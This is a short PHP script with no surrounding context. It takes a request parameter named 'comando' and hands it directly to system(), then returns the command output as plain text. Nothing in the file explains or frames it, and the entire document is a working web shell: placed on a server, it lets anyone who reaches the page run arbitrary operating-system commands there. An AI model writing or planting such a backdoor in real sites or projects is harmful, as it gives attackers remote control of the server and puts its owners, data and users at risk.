  <?php
    
    header("Content-type: text/plain");

 

	if (isset($_REQUEST["comando"]))
	{$comando=$_REQUEST["comando"];
	   echo system($comando);}
 


	 
    ?>
    
